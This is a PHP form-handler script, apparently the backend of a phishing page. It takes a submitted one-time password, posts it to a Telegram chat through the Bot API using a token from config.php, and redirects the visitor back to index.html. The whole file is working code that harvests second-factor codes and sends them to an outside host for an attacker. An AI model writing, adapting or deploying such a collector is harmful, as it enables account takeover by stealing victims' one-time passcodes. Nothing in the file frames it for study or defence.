<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method not allowed.');
}



$otp = trim($_POST['otp'] ?? '');




    




$configFile = __DIR__ . '/config.php';

if (!is_file($configFile)) {
    http_response_code(500);
    exit('config.php is missing.');
}

$config = require $configFile;

$botToken = trim((string)($config['bot_token'] ?? ''));
$chatId = trim((string)($config['chat_id'] ?? ''));

if ($botToken === '' || $chatId === '') {
    http_response_code(500);
    exit('Telegram configuration is missing on the server.');
}

$message = "New OTP survey\n\n";
$message .= "otp: " . $otp . "\n";


$telegramUrl = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$ch = curl_init($telegramUrl);

curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);

$response = curl_exec($ch);

if ($response === false) {
    $error = curl_error($ch);
    curl_close($ch);

    http_response_code(500);
    exit('Telegram connection error: ' . $error);
}

$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

curl_close($ch);

if ($status !== 200) {
    http_response_code(500);
    exit('Telegram error. HTTP status: ' . $status);
}

$result = json_decode($response, true);

if (!is_array($result) || ($result['ok'] ?? false) !== true) {
    http_response_code(500);
    exit('Telegram returned an invalid response.');
}

header('Location: index.html');
exit;
